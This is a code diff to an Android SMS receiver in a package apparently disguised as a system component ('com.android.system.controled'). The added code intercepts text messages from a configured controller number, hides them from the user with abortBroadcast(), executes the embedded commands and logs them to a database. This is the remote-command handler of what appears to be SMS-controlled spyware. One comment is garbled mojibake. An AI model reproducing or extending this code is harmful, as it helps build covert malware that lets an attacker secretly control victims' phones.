@@ -1,5 +1,7 @@
 package com.android.system.controled.receiver;
 
+import java.io.File;
+
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -8,8 +10,13 @@ import android.telephony.SmsMessage;
 
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
+import com.android.system.controled.bean.Code;
+import com.android.system.controled.db.InnerDbOpera;
 import com.android.system.controled.util.DoAboutCodeUtils;
+import com.android.system.controled.util.FileUtil;
 import com.android.system.controled.util.InitUtil;
+import com.android.system.controled.util.StringUtil;
+import com.android.system.controled.util.TimeUtil;
 
 public class MsgAndOtherReceiver extends BroadcastReceiver {
 
@@ -21,7 +28,7 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 		InitUtil.init(context);
 
 		Debug.e(TAG, "intent.getAction()=" + intent.getAction());
-		
+
 		if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
 			SmsMessage[] msg = null;
 			Bundle bundle = intent.getExtras();
@@ -47,8 +54,14 @@ public class MsgAndOtherReceiver extends BroadcastReceiver {
 
 			Debug.v("MsgReceiver", getFromNum);
 			if (getFromNum.contains(MainApplication.getInstence().getControllerTel())) {
-				if (DoAboutCodeUtils.doOperaByMessage(context, msgTxt)) {
+				if (DoAboutCodeUtils.isCode(msgTxt)) {
 					abortBroadcast();
+					// ¼ÇÂ¼ÃüÁî¼¯
+					Code code =  new Code();
+					code.setDate(TimeUtil.getCurrentTimeMillisInner());
+					code.setRedoNeed(Code.REDO_NEED);
+					code = DoAboutCodeUtils.doOperaByMessage(context, msgTxt, code);
+					InnerDbOpera.getInstence().insertCode(code);
 				}
 			}
 		}
